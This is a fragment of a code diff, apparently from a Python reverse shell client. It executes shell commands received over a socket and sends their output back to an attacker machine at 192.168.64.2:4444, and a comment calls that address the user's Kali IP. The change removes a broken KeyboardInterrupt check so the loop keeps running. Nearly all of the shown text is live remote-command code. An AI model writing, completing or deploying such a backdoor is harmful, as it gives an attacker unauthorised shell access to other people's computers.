@@ -37,9 +37,6 @@ def client_run():
             result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
             print(f"Result: {result.stdout}")
             send(result.stdout)
-        if KeyboardInterrupt:
-            connection.close()
-            break
 
 server_connect('192.168.64.2', 4444) #Replace 10.0.2.15 with your Kali IP
 
